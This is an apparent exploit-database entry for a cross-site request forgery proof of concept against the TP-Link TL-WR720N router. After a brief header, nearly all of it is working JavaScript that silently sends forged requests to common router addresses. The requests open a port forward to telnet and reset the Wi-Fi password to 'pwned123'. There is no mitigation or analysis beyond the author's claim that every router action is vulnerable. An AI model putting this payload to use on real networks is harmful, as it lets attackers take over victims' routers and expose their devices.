Exploit Title: TL-WR720N 150Mbps Wireless N Router - CSRF
Date: 21-3-2018
Exploit Author: Mans van Someren
Vendor Homepage: https://www.tp-link.com/
Software Link: https://static.tp-link.com/resources/software/TL-WR720N_V1_130719.zip
Version: All versions because its a 0day
Testen on: Google Chrome - Windows 10
  
this is only a portforwarding & change wifi password PoC but every action I found on the router is vulnerable to CSRF
*/
  
var ROUTER_HOSTS = [&#039;192.168.0.1&#039;, &#039;192.168.1.1&#039;];
var ROUTER_PORTS = [&#039;80&#039;, &#039;8080&#039;];
  
function portforward(router_host, router_port, host, port) {
    var img = new Image();
    img.src = &#039;http://&#039; + router_host + &#039;:&#039; + router_port + &#039;/userRpm/VirtualServerRpm.htm?Port=&#039; + port + &#039;&Ip=&#039; + host + &#039;&Protocol=1&State=1&Commonport=0&Changed=0&SelIndex=0&Page=1&Save=Save&#039;;
}
  
function change_wifi_pass(router_host, router_port, newpass) {
    var img = new Image();
    img.src = &#039;http://&#039; + router_host + &#039;:&#039; + router_port + &#039;/userRpm/WlanSecurityRpm.htm?vapIdx=1&wepSecOpt=3&keytype=1&keynum=1&key1=&length1=0&key2=&length2=0&key3=&length3=0&key4=&length4=0&wpaSecOpt=3&wpaCipher=1&radiusIp=&radiusPort=1812&radiusSecret=&intervalWpa=86400&secType=3&pskSecOpt=2&pskCipher=3&pskSecret=&#039; + newpass + &#039;&interval=86400&Save=Save&#039;;
}
  
for (var i = 0; i < ROUTER_HOSTS.length; i++) {
    for (var j = 0; j < ROUTER_PORTS.length; j++) {
        portforward(ROUTER_HOSTS[i], ROUTER_PORTS[j], &#039;192.168.0.1&#039;, &#039;23&#039;);
        change_wifi_pass(ROUTER_HOSTS[i], ROUTER_PORTS[j], &#039;pwned123&#039;);  
    }
}

